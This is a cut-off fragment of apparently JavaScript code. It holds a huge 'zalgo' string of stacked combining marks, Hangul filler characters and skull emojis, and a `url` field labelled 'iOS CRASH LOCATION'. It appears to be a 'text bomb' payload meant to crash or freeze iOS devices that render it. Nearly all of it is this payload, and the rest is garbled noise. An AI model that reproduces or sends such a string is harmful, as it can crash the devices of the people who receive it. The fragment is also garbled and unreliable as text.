̨̡̡̧̧̡̡̧̢̺̞͙̣͔͓̹͖̫̭̫̦̝͖̙͚̭̘͈͈̪̤̤̙̰͚̤̺̱̖̖̥̘̙̮̠̺̩̜̞̜͔̝̪͚̻̥͈͉̲͇͈̪̩̫̱̩̱͚͎̘̣̮̖̬̘̥͓͓̥͎̣̗̖̺̣͖̯͕̳̣͙͜͜͜͜ͅᆞ̷̢̛̛̛̳͉͍̘̞̫͔͚͇̪̬̹̟̭͍͎͓̦͑̒̋͒̈̏͗̔͒͒̑̽́͐͂͆̃̂̂͐͛͋̾̋́̆̑̀͋̂̅̽̒̃̾͑͐̎͑͛̉̆̒̀̌̍̔͛̂̀̍̒̅̈̂͊͐̽̏͋̉̃̆̆͒̓̿̿͋̀́̉̔̐̀̔̒̿͌̐̓̀̾̒̐̌̈́͊̀͗̄͗͑̑̌́̔̀̕̕̕̚̚͘͝͝͝͝͝͝͠͝Ơ̶̢̡̧̧̛̛̛̛̬̟̘͓̗̝̺̺̫̺͇̫͇̫̠̤̗͍̫̜̩͇̯̻͕̖̮̙̱̤͚͎̟͍̦̙͈̟̦̱̖̠̦̮̗͖̭͚̪͕͎͉̥̥̞͖͓̳̩̺͇͎͋̈́̅̈̅̔͂͋̇͐̔̈́͗̔̈́̃̃̌̌́͑̌̉̀̆̽̓̊̈́̀̈́̑̾̌̍̑̂͋͑̄͂͑̈́́̋́̑̈́̉̄͑̊̓͊̈́͆̒̅͒̇͊́͗̂͐̈́̾̀̂́̄̿̋͒̓͌̅̎̑̎͒̈͑͛̐̂͑̈́̃̓͗̆̇̍̀̈́͊̓͂͛̃̈̅͛̍̍̋̈́̌͗͌̍͆͆͆͐̐̈͒̈́͑̾͋̊́̊͂̀̏̀͌̍͒̔͛̾̒̉͂̊̏̅̾̑̓̂̀͑̂̈́͌̇̊͊̅̂̿̌̾̆͆́̀̐̂͗̋̆̀̀̌̓̑̈́̿̆̀̒͌̓̉́̇̀͊̾̓͛͗͋̎̈͑͌͑͘͘͘͘̚̚̕͘͘̕͘̕̚͝͠͠͠͝͝͝͝͝͠͠͠͠ͅᆞ̴̧̡̢̧̨̡̧̧̨̧̧̢̢̡̨̡̡̡̡̡̛̛̛̛̛̛̛̘̺̹̯͙̗̩̖̻̼̺͎̮̬̟̭̰͔̞̻̜͙̥̞̗̖͔͖̺̼͉̯͈͙͕̘̲̙̼͈̫̞̜̰͔̖̮̦̙̻̬̩͇̖̮͕̭̪̤̘͈̖̩͍̩̰̪̯̠͕̻̖̩͈͚̣̜̭͙͖͉̪̙̠̼̝̺̪̯̣̭̞͎̤͕͔̯̞̤͖̘̹͈̤̖̺̖͎̼͙͚͚̲͇̺̙͎̰̳̞͓̲̜̲͈̩̟͎̞̙͚̪̳̭̳̟̥̱̤̲̤̼͙͇̼̯͚͖̜̯̟͖̮̬͔͔̬͙͎͖̤͍̤̥̫̗̥͈̜̼̝͉̮̹̰̦̺̠̣̘̲̪̗̯̪̻͇͍̱̙̮̯̹̜̥͕̳͓͓̗̖̹̮̫̫͍̲͔̺͔̰̪͉̮̦͔̜͖̤̯͔̠̺̖̥͚̤̥̣̗̲͇̻̤̹̞̫̙̼̑͊̿̆͒͗̀̆̀̾͐̽̏̈̒̈̉͐̀́̈̌͗̈́͋̏̀́̀͌͒̐̾͐̀̃̿̔̐͑̃̓́̇̒̃̓͑̑̆̾̆̓́͌̒̔͗̓͒̽̊̽̑͋͌̐̓͑̀̈̈́̈́̃͋͒̅̍̏͊̅͂̽̔͑̈́̋̎͌͌̈́̈̊͋̑̎̅̃͋̿͛̌̂̊̓̽͒̑́͆̉͗̀̎̅́̎̒͋̒̊͊̋̾͂̆̈́̓̀̀̈́̓́̆́͆́̋́̍̉̆͛̔̈́͆͐̍̒́̒͋̇̃̚͘̕̕͘̚̕̕̕̕͘͘͜͜͝͝͠͝͠͠͝͝͠͝͝͝͝͠͠ͅͅͅͅͅͅᆞ̶̨̨̨̡̨̨̧̢̡̢̧̨̧̨̢̛̛̛͈͔̱̖̱͙̣͚̮̦̗̜͚͈̹̩͕̖̺͚̦̩͈̯͔̗͚͈͎̼̗͍̝̝͈̘͉͉̥͇͚͔͓͎̣̼͖̝̜̻̺̥̟̣̗̮̭̻̮̱̰͇̖̻̺̙̳͇͙̯̳͕̮̬̙̣͓̲̳̖̬̟͔̜̱͓̪̤̱̬̝̥̺̰̠͚̪͔̘̙͚͓̜̜͈͇̘̮͕̫̪͓͉͕̰͈̹͎͚̱̗̝̼͈̞̰̮̭̤̹̗̙̻͉̮͍͍̫̳͎̣̤̻͈͎͈͈̗̣̪͕͕̠̮̙͍͔͔̼̥̜̻̗͊͋̏̀̆͗̄͋̽̀̏̅̓̒̽̑̈́̽̏̎́̋̃̆͊̆̐̍̓̆͊̆̉̑̐͛̄͋͑̽́̍̇͂̆͐̆̎̒̓̍̌̀̎̋̐̌̋̂̑̆̀̏̍̊͌͒̈́̃̇̉̾͛̇̃̃͒̑̀̔̌̂̄͌̽͂̓͋̋̄̔̈̈́̊͛͒̈́͌̒̄̈́̔̌͗̓͋̒̉̔̚͘̕͘͘͘̚̕͜͜͜͜͜͜͠͠͝͠͝͝ͅͅͅͅͅͅN̷̢̢̧̨̢̛̛̛̛̛̛̯̱͙͉͚͎̮̲̣͖̻̜̣̯͚̻͇͓͔̥̭̥͙̝̹̫͔̪͈͕̱̼̹̺̩͉͎͕̝͓͈̘̘̳̫̼̲̪̫̟͖̺͖̩̟͉̘̮͍̥̪̤̲͙̭̼̖̙̠͓̥̳̰̣̼̻̺̝̲̻̮̱͉̫͔̣̪̬̩̔̃́̈́̀̈́̉͆̀́̏̒͛͌͋̓̂̌͛́́͑̈̊͗̒̓̄̾̒͒̂̉͐͐̾͛̓̅͂͋̆̄́̉̉̊͌̅͗̾͐̐͒̆̆̇͗̂̃̊̐͌̈͂̐͆̆̎̋͋̄͒͆͛̽̀̓̽̈́̍̍̑̇̈́̿̍́̅̾̀̾̀̃̽̐͊͛͌̈̇̾̂̓̉̈́̽͑̓̂̅́͆͗́͛̌͌́̂͊͌̓̏̊̀͋̔̐̂͑̄͆̈́͌̿̀̓̌̋̋̀̀̃́͒̇͂̄͒̀͋͌̇̒̏̓̂̅̇̀͊͋̈͌̐͊͛͒̇̐̐̔͗͋̓͋̾̐̐͑̀̀̄̊́̏̓̑̾̀͂͌̑̀̍̍̐̈́̄͛̇̉̈̐̑̄̐͌̎̈́̚͘̕̕̕̚͘̕̕̚̚̕̕̕͘̕͘͜͜͠͝͝͠͠͝͝͝͝͝͠͝͠͠͝ͅͅͅᆞ̸̡̧̢̧̧̢̨̡̧̢̡̢̧̨̢̡̡̛̛̛͎̺̮̤̜̫̼͚̣̠̙̬͔̻̼͖̬͇̺̮͖͈̬͔͍̜͖̺̻̞͖̪̞͚͉̱̣̹͓͇͎̻̞̫͍̹͓͈͓͕͉̣̩͖̺̩̪̖̺̤̭̲̰̰̥̤̰̗͚̹̱̳͕͔̱͇̦̟̬̱̙͓̭͉̟͈̻̻̟̯̲̦͈͓̱̰̮̘͍̳͙̲̦̻̖̯̟̱̟̮̯̟̫̜̗͍̲̺̪͚͈̮̳̳̣̻͚̼͙͇̙̹͓̣͎͎̥̬͔̯͖͕͎͉͎̪̝͍̙̳̤͍̪͎̥̲̻̯͍͙͉̣̼̝̤̟͇̰̦̦͎̹̼͚̩͇̠͍̭͖̗̬̯̥̰̣̮̤͕͔̞͚̱̲̲̫̘̫̗̹͚̘̲̯̼̩̬̥̩̝͙̞̙̤̳̫̭͕̼̤̫̣̦͚̺̼̝̩͚̭̳̫͖̪͈̓̀̑̑̽͊͆̅̄͗̇̔̌̑̽͗̄̾̈̋̍̅̓͐͐̂̉͂͌̀͆́̀̐̂͑̐̀̎̀̂̓̂̽͂̒̈́͑͌̋̓̔͐̎̓͗͆̊̉͆̒̈̇̇̽̀̃̃̾̿̏̅̿́̀̔͋̈͗̄̈̒͒̈́̃̄̓͋̐̋͐̐͗̾̄͗̅́̉̀̄̾̔̔͆̂̒̌̓͂͂̋̃̌̂͒̒͋̃͐̅̊̽̓̒̽̑͆́̌̏̕̕̚̚̚̚̚̕̚̚̕̚͜͠͝͝͠͝͝͠ͅͅͅͅͅͅͅ☠̴̨̡̡̛̛̙̜̙̖̩̩̫̮̹͈̱͍̲̠͉͚͓̪̯̹̻͚̣͍͕̖̻͎̭̹̞̻̙̼͇̘͓̰̯͇̳̪͇͓͕̱͎͈͎̞͉̗̯̪̲̘͙̞̯̜͈͉̼̼̺̲̭͙͙̃̇͗̈̅̓̍̀̈̾̌̆͊͋͛͋͌̓̋͋̾́̈͊̓̀̋͐̓͋̊͒̆̏̓̈́̓̇̆̓̄̐͗͛͐͛͑͋͊͌̈̎̿̈̈̅̿͒̌̈͂̽͒̑̂̑̀͂̌̀̆̍͆͐͂̋̃̈́̅̈̍̈͊̽̋̓́̓̌̍̒͛̅̎̎̊̽̎̎͐̈́̈́͗͛̈́̏̋͗̑͒̌̐̽̋̀̅̑̒̔̄̈̈́̈́͊͛̅͆̆͆̀̈́̈́̑͋͆͐̏̋̈́̇̒̄̆̀̿̂̀̇̑̄̃̊͛̎͂͛̈́̾̉͋̈͂̎̉͆͘̚̚̚̚̚͘̕̕̚͘̚̕̚͘̕̚̚̚̚͘̕͘̕̕͜͜͠͠͠͠͝͝͝͝͠ͅͅͅͅͅ️̶̢̢̡̡̧̤͖͔̼̗͎̗͔̘̪͙̺͇̥͚̤͈̪͇̥̥͙̳̫͈͓̙̗̦͍͍̭̜̮͇͎̖̥͈̬̣̲͉̦̱̬̦͔̰͙̠̣̹̥͙͐̉̅̔͜͜ͅͅͅͅ',
      url: `https://☠️ᆞIᆞᆞOᆞᆞSᆞ ᆞCᆞᆞRᆞᆞAᆞᆞSᆞᆞHᆞ ᆞLᆞᆞOᆞᆞCᆞᆞAᆞᆞTᆞᆞIᆞᆞOᆞᆞNᆞ☠️-☠̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ ̵̨̧̡̧̧̨̢̢̡̨̡̧̢̢̨̨̧̢͖̦͕̹̮̬̹͇̰̺̹̺͇͕̣̦̥̙̤͓̤̥̳͚͙̘͖̙̣̩͇̻̗̹͓̹͈̲̙̘̗͓͈͎̘̝̻̘͇̦͇̘͎̤̰̣̠͚̩̼͇̪̤̺̣͉̱͓͍̮̖̘͍̜̣͈̺̠͇͉̳̙̩̟͎̻̜̗̳̭͚̹̭͔̣͓̻̭̝̞̬̪̯̺̣̱̥͎͖̪̦̙̟̥̦̟̭͓͙̲̼̲̣̹̜̪͍̙͚͕͙̩͙͎̣͉̲͍̘̻̟͚͈̖̣̼̟̺̟̲̳̺͇͖͕͍͚͙̭͉̬̠̹̺͍̖͕̼͙̞̲̼͍̲̣̘̫̲̭͖͑̏̈́̃̈́͋̿͋̀͊͛͛̎̏̀̊̊̇̒̈͊͆̇̄̾̽̾͒̋̓͛̾̈́̎̚̚̚͜͜͠͝͠ͅͅͅͅͅͅᆞ̴̢̨̨̧̢̨̨̢̡̢̢̨̨̡̨̡̧̧̧̧̡̨̨̢̢̡̧̧̢̞̟̪̪͉̺̥͓̪̦̲̖̼͍̲̳̬͈̲̬̹̖̩̗͕̠̻̪̦̞͇̭̮͇̲̗̥̟̣̠͍̭̟̥͍̗̘̼̮̫̹̲̼̬͇͈͚̤̺͎̭͓͈̯̗̮͉̲̩̘̙̗̱͍̳̖͇̠̯͔̺͍̫̼͖͓̥̫͔̗̩̻̪̼̝͚̠̼̺̰͉͍̠̭̬̞̻͙̠̞̹̪̫̝̼̺̻͚̲̣͓͚̜̤͇̯͖̼͍̣̻̹̯̱͔̰̪̻̤̭̟̥̥̥̭̹̲͖̲̖̞͍̘̭͙͈̠͈͉̗̲͇̣̰̯̣͍̗̼̦̱̠̞̘̪̺̙̖͉̗̻̹̟̪̯͔̰̺̳̞̗͕̻̞̯̭̤̙̬̥͙̣̼͓̳͎̩̙̻͓͈̭̘̯̪̖͕̜͖̯͎̼̟̻̦͔̮̫̣̯͈̼̦̯̳̮̘͎̤̬̝͖̀͌͐̄̓́̈̀͑͆̆͘͜͜͜͜͜ͅͅͅͅͅͅͅC̷̡̨̨̨̧̧̧̨̧̨̢̢̢̢̡̡̢̡̨̨̧̡̢̢̢̡̧̧̧̡̛̛̲̜̜͚͉͔̟̮̜̖̖͎͓̥̥̼̦̲̭̹͖̤̪̖͉͔̣̳̻͇̬͕͈͓̳̖̣͓̙̺̣͖̝̯͈̥̯̳͔̝̞̝͓̫̬͇͔͎̥̥̗̝̞̮̖̞̱̰̣̣͚͈̩̣̜̥̳̫̬̰̱̙͎͕͔̤̟̻͈̩̝͔̥͎̦͎̫̲̪̦̭̟̘̤͓̟̪̥̬̟̜͍̠̲̫̹͓͍̙̯̱̜̗͍͇͖̪̱̮̳̫͍̘̯̪̼͚̭̣̠͉̤̞̙͓͉̥̙̝̗̙̠̺̜̞̤̻̳̦̣̰̼͈̫̗̝͉͔͈̳̝̪̪̼̼̫͍̖̣̹̠̟̟̫̰͓̺̱̖̲̖̘̙͔̝͙̫͕͎̪̳̰̥̟̘̮̲̜̼̜̰̹̬̼̰̐̿̿̆̀͋̌̆̌̒̃͆͒̆͒́͆̈́̓͒͊̿͌̔̎͗͋̍̏̐͆̈́͐̓͊̄̈͌̽͛̔̒͌͌̋͌̈́́̀̄̇͋̈́̀͌̇͒̍͌͐̍̍͂͋͒̔̄̾͆̌̇́͛͌͑́̀͗̎͒̐̾̿͊̔̒̐͗͋̏͒̈̈͋̈̔́̓̒͆̒͒͐̓̀́͂̓̈́͆̈͘͘̚̚̕̚̕̚̕̚̕̚̕͜͜͜͜͝͠͝͝͝͝͝͝͝ͅͅͅͅᆞ̵̡̧̛̭̹̝͖̩̫͓̝̖̰̲̙̮̟̟̞̮̙͉͓͕̐̽͛̈́̓̇͗̎͒̓̇̃͛͛͗͛̍̐͗͗̏̓͛̐̈́̍͂̈͂͛̔̍̾͆͒̿̈̽͐̌̂̚̚͘͘͘̚͘͜͠͝͝͝͠͠͠ᆞ̶̡̧̨̢̨̢̢̡̢̢̡̧̨̢̢̡̡̨̢̡̨̨̧̛̛̹̯̰̪͖̺̞̮̣̯̺̦̯̜̱͓̭̜̥͈̳͎̖̜̝̤̯̟͓̬̮̝̠͓̼̬̻͉̙̲̻͕͕̠̝̞͈̤̥͉̗͎̹̜̺͇̱͙̬̦̙̗͖̩̪̝̖̘̥̮̜̜͕̫̙͚̫͕̭̼͈̩̦͎̬̗̬̘̤͓͇̺̜̤̩̼͍̣̦̳͎̬̦̤̱͍͙̭͉̖̣̳̖̣͈͙̗̝͓̤͈͔̹͈̰̜̼̼̤̟̰̻̦̘̥͕͙̤̙͕͍̭̘̘͕̞̘͉̟̻̠̭͓̺͖̩̭̬̪̦̪̝̤͉̜̥̮͍͕̥̪̣̼̼̜̥̱̟̪͇̹͍̪̖͇̭̥̝̤͇͉̯̬̦͓̜͎̝̭͇̱̰̰̼̰̼̥̜̮̰̯͕͉̣̣̠͙̠̖̻̩̙͎̙͖̜̺͙̫̯͎̱̄͗̌̅͗̒̒̾́̇͛̄̆̃̎͑̈́̅̐̿̎̃̅̒̂͂̀͗̌̓́́̇̆͂͊̒̀̊̍̑͑̍̓͊͗̿̀̂̃͊͋̃̑͒͂̾̌͒͊̎̀̑̑̀̓̓͆͛͗̉̓̄̏̂̐̍̉̋̉̎̇͐́̃̽́̅̋̑̓̃̄̌̑͗̓̔̀̾̾̋̔̄̐̔͐͂̀̔̒̈̎́̈́́̂̀̀̓͂̏̃̋͑̆̃̃̀̃̽͐̔̆̽̈͊͒̍͐̽̾̾̇̍͂͐͑͒͊͋͐͗̈̍͒̿̽̔̔̋͆̐̿̀̽̒͂͛̈̅̍̿͗͂͊̀͐̍̓̌̓͌̎̅́͂̎̔̇͂̚̚̚̕͘̚̕̕̕̕̕̚̕̕͘̚̚̚̚͜͜͜͜͠͠͝͠͝͝͝͠͝͝͠͝ͅͅͅͅͅR̴̡̧̨̢̨̡̧̡̛̛͓̘͓̻͓͇̥̠͚̻̰̩͕̞̲͔͔͔̳̪̩̯͎̜̭͕͚̦̖̤̞͍̯͇̪͓̼̭͈̗͉̗̞͈̫̖̙̥͍̤͙͓͉͇͉͈̩̈́̿͋͌̎̉̍́̉͋̾̉͑̏̋̓͌̐͜͝͝ᆞ̶̧̧̡̨̡̡̨̢̨̧̨̡̧̡̨̛̛̟̤̣̘̤͎̤͕̟̙͎̩̭̝͔͇̰̝̬̘̣̹̝̯̥̭̯̝̲̺̤͔̬̟͇̲͍̣̮͔̞͓̘̱̝͕̼̰̳̤͚̙̰̬̭͎͇̬̹̖̹̰̦̖̞̟̥͍͔̻͎͍̦͇̪͓̠͙̳͍̙̪̤̭͇̹̝͚̩̹̰̩̠͓͓̙̦̩͔̪̤̜̺͔̜͔͖̖̗̜̣̥̣͎̠͈̙̺̱̗̙̯̤̜̜͍̖̳̟͗̀̈́̐̂̿͂̽͋́̿̋͒̆̽̓͆̀͛͑́̈̾́́̓̊͋̉̎͗̀̒͌̐́̀́̈́̓̉̈̕̕͘͠ͅᆞ̶̡̢̛̛̛̛̛̛̛͕͎̮̭̤̺̪̻̬̬̦̼̻͕͕͉͈̦̖̱̙̺̩͉̙̐̏͌̒̇͗͒̃̌̅̄̽̆̋̿̾̄̆͐͐̋̔̽̔̅̒̍͆͒͂̅͋́̂̋̄̽̅́̇̈̄͋̓̆̋͒́̊͑̾́͆́̾̇̓̉̂͂̃̽̂̋̋͂̃͋̓͋̿͊̾͒̔̂̍͛̆̂̉̽̽͋̂͌̑͑̽̈́̽̒̊̋͗̾̊̍̏̊͛̄̆͋̊̓̏̈́͂̽̋̀͌͂͐̂̏̿̉͗̀͐̒̋͛͋̐̑͂̓̆̄̎̒͑̿̔̉̔̍͑̎̊̓̊̀͂̉͐̈͐̀̄́̆̑̋̽̀͒͗̓̉̊̃̓̄̑̄͂̒̍̂̈̃̈́͆̋̎̍̕̚̕̕̚̕̚͘̚̕̕̚̕̚̕̚͘͘̚͘͘͠͝͝͝͝͠͝͝͝͠͝͝͝͝͠Ą̴̛̛̼̪̮̩͍̯͎̙͚͕̮̹̤͓̳͎̬̱̟̣̈́̔̓̀̌̎̉̓̑̊́͊̏̓̔͗̈́̀̒̋̍̂́̈́́̿̍̾̿̋̉͋̈́̉̓̅͐̄͋͒̏́͆̄͐̈́̋͊̒̅̏̓͐͊̑͊̆̓̾̃͒̈͑̽̓̒̈́͋̈́̈́͒͗̽̔́̅̍̐̀̓̅̑͗̅̎́̑͂̾͊́́̎̄͆̐̒̋̿̓͋́͋̆͋̈́̄͑́̈͛͆̒̋̉͋̈͑̐̎́͑̆̂̃̄̽̏͒̉̅͊̆̏̇̽̒̈́̈͋̐̎̎̅͌̽͊̍̑̋́͐̀̀̏͑̆̾̂̍́́̈́͛̐̾̓̒̋̓̍͋̋̈̃̅̊͒̄̈́̀̿͂̅͐́̿̈́̆̌̈̒̊̾̐̆͐̐̍̌͂̓̀̂̾̕̕̕͘͘͘̕̕͘̚̕̚͘̚͘͜͝͝͠͝͠͝͠͝͝